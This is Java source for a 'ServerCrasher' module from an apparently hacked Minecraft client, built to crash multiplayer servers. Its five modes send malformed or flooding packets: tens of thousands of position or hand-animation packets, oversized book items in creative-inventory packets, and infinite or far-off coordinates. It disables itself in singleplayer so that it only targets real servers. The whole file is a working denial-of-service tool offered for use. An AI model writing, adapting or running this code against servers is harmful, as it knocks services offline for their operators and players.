package com.mentalfrostbyte.jello.module.impl.world;


import com.mentalfrostbyte.Client;
import com.mentalfrostbyte.jello.event.impl.player.EventPlayerTick;
import com.mentalfrostbyte.jello.managers.util.notifs.Notification;
import com.mentalfrostbyte.jello.module.data.ModuleCategory;
import com.mentalfrostbyte.jello.module.PremiumModule;
import com.mentalfrostbyte.jello.module.settings.impl.ModeSetting;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.CompoundNBT;
import net.minecraft.nbt.ListNBT;
import net.minecraft.nbt.StringNBT;
import net.minecraft.network.play.client.CAnimateHandPacket;
import net.minecraft.network.play.client.CCreativeInventoryActionPacket;
import net.minecraft.network.play.client.CPlayerPacket;
import net.minecraft.util.Hand;
import team.sdhq.eventBus.annotations.EventTarget;

public class ServerCrasher extends PremiumModule {
    public int field23695;

    public ServerCrasher() {
        super(ModuleCategory.WORLD, "ServerCrasher", "Crashes a server");
        this.registerSetting(new ModeSetting("Mode", "Crasher mode", 0, "Flying Enabled", "Vanilla", "Book", "Infinity", "BrainFreeze"));
    }

    @Override
    public void onEnable() {
        this.field23695 = 0;
    }

    @EventTarget
    public void method16482(EventPlayerTick var1) {
        if (this.isEnabled()) {
            if (mc.isSingleplayer()) {
                this.toggle();
            } else {
                String var4 = this.getStringSettingValueByName("Mode");
                switch (var4) {
                    case "Flying Enabled":
                        double var6 = mc.player.getPosX();
                        double var8 = mc.player.getPosY();
                        double var10 = mc.player.getPosZ();
                        double var12 = 0.0;
                        double var14 = 0.0;

                        for (int var26 = 0; var26 < 50000; var26++) {
                            var14 = var26 * 7;
                            mc.getConnection().sendPacket(new CPlayerPacket.PositionPacket(var6 - var14, var8 + var12, var10 + var14, false));
                        }

                        Client.getInstance().notificationManager
                                .send(new Notification("ServerCrasher","Trying to crash the server.."));
                        this.toggle();
                        break;
                    case "Vanilla":
                        if (this.field23695++ >= 10) {
                            this.field23695 = 0;

                            for (int var25 = 0; var25 < 100000; var25++) {
                                mc.getConnection().sendPacket(new CAnimateHandPacket(Hand.MAIN_HAND));
                            }

                            Client.getInstance().notificationManager
                                    .send(new Notification("ServerCrasher","Trying to crash the server.."));
                        }
                        break;
                    case "Book":
                        ItemStack var16 = new ItemStack(Items.BOOK);
                        ListNBT var17 = new ListNBT();
                        CompoundNBT var18 = new CompoundNBT();
                        String var19 = "";

                        for (int var20 = 0; var20 < 5000; var20++) {
                            char var21 = (char) Math.round(32.0F + (float) Math.random() * 94.0F);
                            var19 = var19 + var21;
                        }

                        for (int var27 = 0; var27 < 50; var27++) {
                            StringNBT var22 = new StringNBT(var19);
                            var17.add(var22);
                        }

                        var18.putString("author", "LeakedPvP");
                        var18.putString("title", "Sigma");
                        var18.put("pages", var17);
                        var16.setTagInfo("pages", var17);
                        var16.setTag(var18);

                        for (int var28 = 0; var28 < 100; var28++) {
                            try {
                                mc.getConnection().sendPacket(new CCreativeInventoryActionPacket(0, var16));
                            } catch (Exception var23) {
                            }
                        }

                        this.toggle();
                        break;
                    case "Infinity":
                        mc.getConnection().sendPacket(new CPlayerPacket.PositionPacket(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, true));
                        Client.getInstance().notificationManager
                                .send(new Notification("ServerCrasher","Trying to crash the server.."));                        this.toggle();
                        break;
                    case "BrainFreeze":
                        mc.getConnection()
                                .sendPacket(
                                        new CPlayerPacket.PositionPacket(
                                                mc.player.getPosX() + 9999.0,
                                                mc.player.getPosY() + 9999.0,
                                                mc.player.getPosZ() + 9999.0,
                                                false
                                        )
                                );
                        mc.getConnection()
                                .sendPacket(
                                        new CPlayerPacket.PositionPacket(
                                                mc.player.getPosX(),
                                                mc.player.getBoundingBox().minY,
                                                mc.player.getPosZ() + 9999.0,
                                                mc.player.isOnGround()
                                        )
                                );
                        if (this.field23695++ >= 200) {
                            this.toggle();
                            Client.getInstance().notificationManager
                                    .send(new Notification("ServerCrasher","Trying to crash the server.."));                        }
                }
            }
        }
    }
}
